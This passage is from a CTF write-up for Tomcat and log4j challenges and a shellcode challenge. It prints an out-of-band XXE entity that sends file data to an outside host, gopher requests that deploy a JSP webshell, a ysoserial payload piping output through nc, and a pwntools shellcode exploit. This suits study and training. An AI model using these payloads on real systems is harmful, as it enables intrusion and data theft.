+<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">c</span> "&lt;!<span class="hljs-attr">ENTITY</span> <span class="hljs-attr">rrr</span> <span class="hljs-attr">SYSTEM</span> '<span class="hljs-attr">http:</span>//<span class="hljs-attr">240.240.240.240:8082</span>/?<span class="hljs-attr">a</span>=<span class="hljs-string">%d;</span>'&gt;</span>"&gt;</code></pre><p>Basically, it first includes the XML DTD, and then it reads the file. Instead of rendering in XML, it sends the file content to us through http protocol. That&#39;s why it&#39;s called out-of-band. Here is the password file of tomcat manager:</p>
+<pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">tomcat-users</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">"manager"</span>/&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"admin"</span> <span class="hljs-attr">password</span>=<span class="hljs-string">"sup3rs3cr3tp4ssc0d3"</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">"manager"</span>/&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">tomcat-users</span>&gt;</span></code></pre><h4 id="almighty-gopher"><a class="header-link" href="#almighty-gopher"></a>Almighty Gopher</h4>
+<p>Since the HTTP protocol in this JAVA XML has no support of <a href="https://en.wikipedia.org/wiki/Basic_access_authentication">HTTP basic authentication</a>, we have to leverage gopher to make the following request:</p>
+<pre class="hljs"><code><span class="hljs-keyword">GET</span> <span class="hljs-string">/manager/list</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: localhost:8080
+<span class="hljs-attribute">Authorization</span>: Basic YWRtaW46c3VwM3JzM2NyM3RwNHNzYzBkMw==
+<span class="hljs-attribute">Connection</span>: close</code></pre><ol class="list">
+<li>The <code>host</code> header is necessary. Otherwise Apache server will return an error.</li>
+<li><code>Connection: close</code> is essential. By default gopher protocol doesn&#39;t close the connection. This will make the whole connection hang. Therefore we should ask the server side to close the connection.</li>
+</ol>
+<p>Simply use URL encoding (percent-encoding) to insert CRLF.</p>
+<pre class="hljs"><code><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span> standalone=<span class="hljs-string">"yes"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE foo [
+&lt;!ENTITY rrr SYSTEM "gopher://localhost:8080/_GET%20/manager/list%20HTTP/1.1%0d%0aHost%3a%20localhost%3a8080%0d%0aAuthorization%3A%20Basic%20YWRtaW46c3VwM3JzM2NyM3RwNHNzYzBkMw%3D%3D%0d%0aConnection%3a%20close%0d%0a"&gt;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>&amp;rrr;<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>dd<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></code></pre><p>And our payload works! The server will return a list of applications.</p>
+<h4 id="gopher-pitfall-(intended-solution-1)"><a class="header-link" href="#gopher-pitfall-(intended-solution-1)"></a>Gopher Pitfall (Intended Solution 1)</h4>
+<p>In Tomcat manager, we can <a href="https://tomcat.apache.org/tomcat-6.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR">deploy an application remotely</a>_Remotely). Therefore our plan is to utilize gopher to smuggle the HTTP protocol, and deploy a malicious application!</p>
+<p>I install a Tomcat docker locally to see the payload of the HTTP request. When deploying an application remotely, the browser will send a HTTP PUT request.</p>
+<pre class="hljs"><code><span class="hljs-keyword">PUT</span> <span class="hljs-string">/manager/deploy?path=/_</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: localhost:8080
+<span class="hljs-attribute">Content-Length</span>: 1234
+<span class="hljs-attribute">Authorization</span>: Basic YWRtaW46c3VwM3JzM2NyM3RwNHNzYzBkMw==
+<span class="hljs-attribute">Connection</span>: close
+
+<span class="json">[WAR application]</span></code></pre><p>In order to create a malicious WAR application and deploy to Tomcat, I found a great <a href="https://github.com/mgeeky/tomcatWarDeployer">Tomcat backdoor example</a>. Here is another <a href="https://tomcat.apache.org/tomcat-6.0-doc/appdev/sample/">official example</a> of a Tomcat WAR application. In fact, we can omit <code>WEB-INF/web.xml</code> and <code>META-INF</code> directory and files. Just creating a <code>.war</code> file with <code>index.jsp</code> is enough. Additionally, both <code>jar -cvf</code> and <code>zip</code> can create a valid WAR application.</p>
+<p>Here is my damn-small webshell <code>index.jsp</code>. Then <code>zip -r pwn.war index.jsp</code> this file.</p>
+<pre class="hljs"><code><span class="xml"></span><span class="vbscript">&lt;%!
+void f(<span class="hljs-built_in">String</span> k) throws java.io.IOException{
+  Runtime.getRuntime().exec(k == <span class="hljs-literal">null</span> ? <span class="hljs-string">"true"</span>: k);
+}
+%&gt;</span><span class="xml">
+</span><span class="vbscript">&lt;% f(<span class="hljs-built_in">request</span>.getParameter(<span class="hljs-string">"_"</span>)); %&gt;</span><span class="xml"></span></code></pre><p>Note: Actually you can use a common webshell, but I found when the POST body is more than 1200 bytes, the connection will time out. I think it&#39;s due to the firewall, since pwn2win CTF uses some VPN isolated environment for this challenge. After I get the shell of the remote machine and I try to download some other files from my computer, the connection will timeout once the file size is more than 1200 bytes approximately. Thus I have to split the file into small pieces......</p>
+<p> ow we can just mimic the request using gopher. Unfortunately, the JAVA XXE gopher protocol doesn&#39;t support all the non-ascii characters. Any character above than <code>%7f</code> will lead to some problems. gopher will append some <code>\xc2</code> <code>\xc3</code> ...... In BlackHat 2012, SSRF VS. Business by Polyakov et al. mentioned this behevior. Refer to the <a href="https://media.blackhat.com/bh-us-12/Briefings/Polyakov/aBH_US_12_Polyakov_SSRF_Business_Slides.pdf">slide P.71</a> and <a href="https://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_WP.pdf">paper P.25</a>. Thanks to @pimps for letting me know that.</p>
+<blockquote>
+<p>The symbols from 7A to 88 in hex were changed by gopher to the <code>?</code> symbol.</p>
+</blockquote>
+<p>However, @pimps creates a amazing tool <a href="https://github.com/pimps/gopher-tomcat-deployer">gopher-tomcat-deployer</a> to create a zip file in ASCII range (0x00-0x7f):</p>
+<ol class="list">
+<li>Timestamp: simply set it to a time in ASCII range</li>
+<li>CRC32: just append whitespace in the uncompresseed file and try to recompute again</li>
+</ol>
+<p>Finally, the payload: </p>
+<pre class="hljs"><code>&lt;%<span class="hljs-title">!void</span> f(String k)throws java.io.IOException{Runtime.getRuntime().exec(k==<span class="hljs-keyword">null</span>?<span class="hljs-string">"true"</span>:k)<span class="hljs-comment">;}%&gt;&lt;%f(request.getParameter("_"));%&gt;
+</span>
+gopher://localhost:<span class="hljs-number">8080</span>/_PUT<span class="hljs-symbol">%20</span>/manager/deploy<span class="hljs-symbol">%3</span>Fpath<span class="hljs-symbol">%3</span>D/_<span class="hljs-symbol">%20</span>HTTP/<span class="hljs-number">1.1</span><span class="hljs-symbol">%0</span>D<span class="hljs-symbol">%0</span>AHost<span class="hljs-symbol">%3</span>A<span class="hljs-symbol">%20</span>localhost<span class="hljs-symbol">%3</span>A<span class="hljs-number">8080</span><span class="hljs-symbol">%0</span>D<span class="hljs-symbol">%0</span>AContent-Length<span class="hljs-symbol">%3</span>A<span class="hljs-symbol">%20183</span><span class="hljs-symbol">%0</span>D<span class="hljs-symbol">%0</span>AAuthorization<span class="hljs-symbol">%3</span>A<span class="hljs-symbol">%20</span>Basic<span class="hljs-symbol">%20</span>YWRtaW<span class="hljs-number">46</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>VwM<span class="hljs-number">3</span>JzM<span class="hljs-number">2</span>NyM<span class="hljs-number">3</span>RwNHNzYzBkMw<span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%0</span>D<span class="hljs-symbol">%0</span>AConnection<span class="hljs-symbol">%3</span>A<span class="hljs-symbol">%20</span>close<span class="hljs-symbol">%0</span>D<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>D<span class="hljs-symbol">%0</span>APK<span class="hljs-symbol">%03</span><span class="hljs-symbol">%04</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%00</span>Z<span class="hljs-symbol">%7</span>D<span class="hljs-symbol">%03</span><span class="hljs-symbol">%1</span>EK<span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span>K<span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%05</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-keyword">c</span>.jsp<span class="hljs-symbol">%3</span>C<span class="hljs-symbol">%25</span>Runtime.getRuntime<span class="hljs-symbol">%28</span><span class="hljs-symbol">%29</span>.exec<span class="hljs-symbol">%28</span>request.getParameter<span class="hljs-symbol">%28</span><span class="hljs-symbol">%22</span>_<span class="hljs-symbol">%22</span><span class="hljs-symbol">%29</span><span class="hljs-symbol">%29</span><span class="hljs-symbol">%3</span>B<span class="hljs-symbol">%25</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span>PK<span class="hljs-symbol">%01</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%03</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%00</span>Z<span class="hljs-symbol">%7</span>D<span class="hljs-symbol">%03</span><span class="hljs-symbol">%1</span>EK<span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span>K<span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%05</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-keyword">c</span>.jspPK<span class="hljs-symbol">%05</span><span class="hljs-symbol">%06</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%003</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span>n<span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span></code></pre><p>Then visit <code>http://10.133.70.7:8080/_/c.jsp?_=curl MYIP</code> to get RCE. I don&#39;t know why the bash reverse shell doesn&#39;t work, so I use python revere shell with <a href="https://evertpot.com/189/">pty</a>. Simply run <code>su -</code> with password <code>RCE_TO_PWN_ME</code> to get the flag in <code>/root</code>!</p>
+<p><code>CTF-BR{{W00T_RCE???_ALL_HAIL_TO_GOPHER_THE_BEAVER_OF_PWNAGE}</code> . There is an extra <code>{</code> in the flag.</p>
+<h4 id="jar-(possibly-intended-solution-2)"><a class="header-link" href="#jar-(possibly-intended-solution-2)"></a>jar (Possibly Intended Solution 2)</h4>
+<p>In the tomcat manager doc, it supports <a href="https://tomcat.apache.org/tomcat-6.0-doc/manager-howto.html#Deploy_a_Directory_or_WAR_by_URL">deploy WAR application from a local file</a>. If we can somehow upload a malicious WAR file to the server, we can deploy the application using <code>file:/PATH</code>.</p>
+<p>In fact, JAVA XXE also supports <code>jar:</code> protocol. Refer to <a href="https://www.vsecurity.com/download/publications/XMLDTDEntityAttacks.pdf">XML Schema, DTD, and Entity Attacks P.15 - 17</a> by Timothy D. Morgan (@ecbftw). </p>
+<blockquote>
+<p>The attack works by sending an initial request which asks Xerces to fetch a jar URL from a web server controlled by
+the attacker.  Java downloads this file to a designated temporary directory using a randomly selected file name.</p>
+</blockquote>
+<p>Since we can include any file in the server, it&#39;s easy to locate the temporary JAR file in <code>/opt/tomcat/temp</code>. One can leverage this technique to create temporary WAR file, and the use <code>deploy?war=file:/opt/tomcat/temp/...</code> to upload the backdoor.</p>
+<p>I didn&#39;t try this but I can see the temporary file in <code>/opt/tomcat/temp</code>. It&#39;s likely this challenge can also be solved in this way.</p>
+<h4 id="failed-attempts-1"><a class="header-link" href="#failed-attempts-1"></a>Failed Attempts</h4>
+<ul class="list">
+<li>Bypass gopher replacement<ul class="list">
+<li>Percent-encoding doesn&#39;t work because gopher will replace it. Sending raw byte doesn&#39;t work either due to XML parsing failure.</li>
+<li>XML escape characters <code>#&amp;x60;</code> doesn&#39;t work either.</li>
+<li>Utilize XML encode. Maybe we can find a encoding supporting raw byte?</li>
+</ul>
+</li>
+<li>Deploy application using HTTP<ul class="list">
+<li>Because in the document, the war is described as a <code>java.net.JarURLConnection</code> class. This class should support HTTP so I tried this <code>deploy?war=http://</code> , <code>deploy?war=jar:http://</code> but none of them works.</li>
+</ul>
+</li>
+</ul>
+<h3 id="message-board-iii-(log-server-rce)"><a class="header-link" href="#message-board-iii-(log-server-rce)"></a>Message Board III (log server RCE)</h3>
+<p>The step 3 is to pwn the Apache log4j server in LAN. Let&#39;s first retrieve some information:</p>
+<ul class="list">
+<li><code>/etc/hosts</code>: We see this line <code>10.133.70.13 log4jserver.local</code></li>
+<li><code>log4j2.properties</code>: Sorry I forget the exact path. The file is in somewhere in <code>/opt/tomcat</code>:<pre class="hljs"><code>log4j.rootLogger=DEBUG, <span class="hljs-built_in">server</span> 
+# <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span> the remote <span class="hljs-built_in">server</span> 
+log4j.appender.<span class="hljs-built_in">server</span>=org.apache.log4j.net.SocketAppender  
+# <span class="hljs-keyword">set</span> <span class="hljs-keyword">set</span> that layout <span class="hljs-keyword">to</span> be SimpleLayout 
+log4j.appender.<span class="hljs-built_in">server</span>.layout=org.apache.log4j.SimpleLayout   
+log4j.appender.<span class="hljs-built_in">server</span>.RemoteHost=log4jserver.local
+log4j.appender.<span class="hljs-built_in">server</span>.Port=<span class="hljs-number">1337</span></code></pre></li>
+</ul>
+<p>Also, the log4jserver has firewalls. It can only communicate with this server of the challenge.</p>
+<p>Google <code>log4j rce</code>. We found <a href="https://github.com/pimps/CVE-2017-5645">CVE-2017-5645</a>.</p>
+<pre class="hljs"><code><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial-modified.<span class="hljs-keyword">jar </span>CommonsCollections6 <span class="hljs-keyword">bash </span><span class="hljs-string">'find / | nc 10.133.70.7 1234'</span> &gt; payload
+
+<span class="hljs-comment"># upload the payload to the challenge server</span>
+cat payload <span class="hljs-title">| nc log4jserver.local 1337</span></code></pre><p>Get the flag easily! <code>CTF-BR{&lt;3&lt;3&lt;3_SERIALIZATION_IS_LOVE_&lt;3&lt;3&lt;3}</code></p>
+<h4 id="failed-attempts-2"><a class="header-link" href="#failed-attempts-2"></a>Failed Attempts</h4>
+<ul class="list">
+<li>Send the payload using gopher because I haven&#39;t solved step 2 first<ul class="list">
+<li>I contact to the organizers and they said I need to solve step 2 first. </li>
+<li>The payload contains non-ascii bytes which gopher will replace them......</li>
+<li>The payload is more than 1200 bytes......</li>
+</ul>
+</li>
+</ul>
+<h2 id="exploit"><a class="header-link" href="#exploit"></a>Exploit</h2>
+<h3 id="minishell"><a class="header-link" href="#minishell"></a>minishell</h3>
+<h4 id="binary-behavior"><a class="header-link" href="#binary-behavior"></a>Binary behavior</h4>
+<ul class="list">
+<li>Call <code>mmap</code> a memory with <code>RWX</code> permission</li>
+<li>Ask for at most 12 bytes input</li>
+<li>Call <code>mprotect</code> to remove <code>W</code> permission from that mmap memory</li>
+<li>Jump to that memory and execute your shellcode</li>
+</ul>
+<h4 id="register-status"><a class="header-link" href="#register-status"></a>Register status</h4>
+<pre class="hljs"><code><span class="hljs-symbol">RAX:</span> <span class="hljs-number">0x0</span> 
+<span class="hljs-symbol">RBX:</span> <span class="hljs-number">0x0</span> 
+<span class="hljs-symbol">RCX:</span> <span class="hljs-number">0x7ffff78baae7</span> (&lt;mprotect+<span class="hljs-number">7</span>&gt;:      <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-number">0xfffffffffffff001</span>)
+<span class="hljs-symbol">RDX:</span> <span class="hljs-number">0x5</span> 
+<span class="hljs-symbol">RSI:</span> <span class="hljs-number">0x1000</span> 
+<span class="hljs-symbol">RDI:</span> <span class="hljs-number">0x7ffff7ff7000</span> (<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">al</span>,<span class="hljs-number">0xa</span>)
+<span class="hljs-symbol">RBP:</span> <span class="hljs-number">0x7fffffffe580</span> --&gt; <span class="hljs-number">0x555555554cf0</span> (<span class="hljs-keyword">push</span>   <span class="hljs-built_in">r15</span>)
+<span class="hljs-symbol">RSP:</span> <span class="hljs-number">0x7fffffffe560</span> --&gt; <span class="hljs-number">0x7fffffffe668</span> --&gt; <span class="hljs-number">0x7fffffffe853</span> (<span class="hljs-string">"./minishell"</span>)
+<span class="hljs-symbol">RIP:</span> <span class="hljs-number">0x7ffff7ff7000</span> (<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">al</span>,<span class="hljs-number">0xa</span>)
+<span class="hljs-built_in">R8</span> : <span class="hljs-number">0x555555757b30</span> --&gt; <span class="hljs-number">0x555555757c30</span> --&gt; <span class="hljs-number">0x0</span> 
+<span class="hljs-built_in">R9</span> : <span class="hljs-number">0x0</span> 
+<span class="hljs-symbol">R10:</span> <span class="hljs-number">0x1</span> 
+<span class="hljs-symbol">R11:</span> <span class="hljs-number">0x202</span> 
+<span class="hljs-symbol">R12:</span> <span class="hljs-number">0x5555555549b0</span> (<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">ebp</span>)
+<span class="hljs-symbol">R13:</span> <span class="hljs-number">0x7fffffffe660</span> --&gt; <span class="hljs-number">0x1</span> 
+<span class="hljs-symbol">R14:</span> <span class="hljs-number">0x0</span> 
+<span class="hljs-symbol">R15:</span> <span class="hljs-number">0x0</span>
+<span class="hljs-symbol">EFLAGS:</span> <span class="hljs-number">0x217</span> (CARRY PARITY ADJUST <span class="hljs-meta">zero</span> sign trap INTERRUPT direction overflow)</code></pre><ul class="list">
+<li>Notice that <code>RDI</code> is address of the mmap memory</li>
+</ul>
+<h4 id="make-memory-writable-again"><a class="header-link" href="#make-memory-writable-again"></a>Make memory writable again</h4>
+<p>As the <code>W</code> permission has already been removed, we need to call <code>mprotect</code> to make the memory writable again. Luckily most of the registers are already well set, we just need to adjust <code>RAX</code> and <code>RDX</code>.</p>
+<p><code>mprotect(void *addr, size_t len, int prot)</code></p>
+<ul class="list">
+<li><code>RDI</code> is already set to address of mmap memory</li>
+<li><code>RSI</code> can be any value</li>
+<li><code>RDX</code> should be <code>7</code></li>
+<li><code>RAX</code> should be <code>0xa</code></li>
+</ul>
+<p>Shellcode (6 bytes):</p>
+<pre class="hljs"><code>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0xa</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>, <span class="hljs-number">0x7</span>
+    <span class="hljs-keyword">syscall</span></code></pre><h4 id="shellcode-to-call-read"><a class="header-link" href="#shellcode-to-call-read"></a>Shellcode to call read</h4>
+<p>After calling <code>mprotect</code>, the register status become:</p>
+<pre class="hljs"><code><span class="hljs-symbol">RAX:</span> <span class="hljs-number">0x0</span>
+<span class="hljs-symbol">RBX:</span> <span class="hljs-number">0x0</span>
+<span class="hljs-symbol">RCX:</span> <span class="hljs-number">0x7ffff7ff7006</span> --&gt; <span class="hljs-number">0xf8eb5e5f5051</span>
+<span class="hljs-symbol">RDX:</span> <span class="hljs-number">0x7</span>
+<span class="hljs-symbol">RSI:</span> <span class="hljs-number">0x1000</span>
+<span class="hljs-symbol">RDI:</span> <span class="hljs-number">0x7ffff7ff7000</span> --&gt; <span class="hljs-number">0x5051050f07b20ab0</span>
+<span class="hljs-symbol">RBP:</span> <span class="hljs-number">0x7fffffffe580</span> --&gt; <span class="hljs-number">0x555555554cf0</span> (<span class="hljs-keyword">push</span>   <span class="hljs-built_in">r15</span>)
+<span class="hljs-symbol">RSP:</span> <span class="hljs-number">0x7fffffffe560</span> --&gt; <span class="hljs-number">0x7fffffffe668</span> --&gt; <span class="hljs-number">0x7fffffffe853</span> (<span class="hljs-string">"./minishell"</span>)
+<span class="hljs-symbol">RIP:</span> <span class="hljs-number">0x7ffff7ff7006</span> --&gt; <span class="hljs-number">0xf8eb5e5f5051</span>
+<span class="hljs-built_in">R8</span> : <span class="hljs-number">0x555555757b30</span> --&gt; <span class="hljs-number">0x555555757c30</span> --&gt; <span class="hljs-number">0x0</span>
+<span class="hljs-built_in">R9</span> : <span class="hljs-number">0x0</span>
+<span class="hljs-symbol">R10:</span> <span class="hljs-number">0x1</span>
+<span class="hljs-symbol">R11:</span> <span class="hljs-number">0x317</span>
+<span class="hljs-symbol">R12:</span> <span class="hljs-number">0x5555555549b0</span> (<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">ebp</span>)
+<span class="hljs-symbol">R13:</span> <span class="hljs-number">0x7fffffffe660</span> --&gt; <span class="hljs-number">0x1</span>
+<span class="hljs-symbol">R14:</span> <span class="hljs-number">0x0</span>
+<span class="hljs-symbol">R15:</span> <span class="hljs-number">0x0</span>
+<span class="hljs-symbol">EFLAGS:</span> <span class="hljs-number">0x217</span> (CARRY PARITY ADJUST <span class="hljs-meta">zero</span> sign trap INTERRUPT direction overflow)</code></pre><p><code>read(int fd, void *buf, size_t count)</code></p>
+<ul class="list">
+<li><code>RDI</code> should be <code>0</code></li>
+<li><code>RSI</code> should be the address of mmap memory</li>
+<li><code>RDX</code> can be any value</li>
+<li><code>RAX</code> is already set to <code>0</code></li>
+</ul>
+<p>We have 6 bytes left to call <code>read</code>. We need at least 4 bytes to control the register <code>RDI</code> and <code>RSI</code>, also 2 bytes for <code>syscall</code>, so we can only read 7 bytes if we execute the following shellcode (6 bytes):</p>
+<pre class="hljs"><code>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rdi</span>
+    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span>
+    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span>
+    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span>
+    <span class="hljs-keyword">syscall</span></code></pre><p>However, we can&#39;t execute the next shellcode because <code>RIP</code> is not set to <code>RSI</code>. Notice that <code>RCX</code> is the address after calling <code>syscall</code> in our previous shellcode, if we set <code>RSI</code> to <code>RCX</code> and jump back to <code>syscall</code>, we can continue execute our new shellcode.</p>
+<p>Here is the shellcode (12 bytes):</p>
+<pre class="hljs"><code>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0xa</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>, <span class="hljs-number">0x7</span>
+<span class="hljs-symbol">_syscall:</span>
+    <span class="hljs-keyword">syscall</span>
+    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rcx</span>
+    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span>
+    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span>
+    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span>
+    <span class="hljs-keyword">jmp</span> _<span class="hljs-keyword">syscall</span></code></pre><h4 id="adjust-bigger-input-size-and-call-read-again"><a class="header-link" href="#adjust-bigger-input-size-and-call-read-again"></a>Adjust bigger input size and call read again</h4>
+<p>The rest is pretty straightforward, as <code>RDI</code> and <code>RSI</code> are already set, we just need to change <code>RDX</code> to a bigger value to read our ORW shellcode.</p>
+<p>Shellcode (6 bytes):</p>
+<pre class="hljs"><code>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>, <span class="hljs-number">0xff</span>
+    <span class="hljs-keyword">syscall</span></code></pre><h4 id="orw-and-get-flag"><a class="header-link" href="#orw-and-get-flag"></a>ORW and get flag</h4>
+<p>Exploit:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
+
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+context.arch = <span class="hljs-string">'amd64'</span>
+
+host = <span class="hljs-string">'200.136.252.34'</span>
+port = <span class="hljs-number">4545</span>
+
+<span class="hljs-keyword">if</span> len(sys.argv) == <span class="hljs-number">1</span>:
+    r = process(<span class="hljs-string">'./minishell'</span>)
+<span class="hljs-keyword">else</span>:
+    r = remote(host, port)
+
+raw_input(<span class="hljs-string">'#'</span>)
+r.recvuntil(<span class="hljs-string">'So what? '</span>)
+
+<span class="hljs-comment"># mprotect(mmap_addr, len, PROC_RWX)</span>
+<span class="hljs-comment"># read(0, mmap_addr+offset, 7)</span>
+sc = <span class="hljs-string">"""
+    mov al, 0xa
+    mov dl, 0x7
+    L20:
+    syscall
+    push rcx
+    push rax
+    pop rdi
+    pop rsi
+    jmp L20
+    """</span>
+
+sc = asm(sc)
+r.send(sc)
+sleep(<span class="hljs-number">0.5</span>)
+
+<span class="hljs-comment"># read(0, mmap_addr+offset, 0xff)</span>
+sc = <span class="hljs-string">"""
+    mov al, 0
+    mov dl, 0xff
+    syscall
+    """</span>
+
+r.send(asm(sc))
+sleep(<span class="hljs-number">0.5</span>)
+
+<span class="hljs-comment"># open('/home/minishell/flag.txt')</span>
+<span class="hljs-comment"># read(fd[rax], buf, 0x30)</span>
+<span class="hljs-comment"># write(1, buf, 0x30)</span>
+<span class="hljs-comment"># exit()</span>
+sc = <span class="hljs-string">"""
+    mov rax, 2
+    mov rdi, rsi
+    add rdi, 83
+    mov rsi, 0
+    mov rdx, 0
+    syscall
+    mov rsi, rdi
+    mov rdi, rax
+    mov rax, 0
+    mov rdx, 0x30
+    syscall
+    mov rax, 1
+    mov rdi, 1
+    syscall
+    mov rax, 60
+    syscall
+    """</span>
+
+r.sendline(<span class="hljs-string">'AAAAAA'</span> + asm(sc) + <span class="hljs-string">'/home/minishell/flag.txt\x00'</span>)
+r.interactive()</code></pre><p>Flag: <code>CTF-BR{s0000_t1ght_f0r_my_B1G_sh3ll0dE_}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
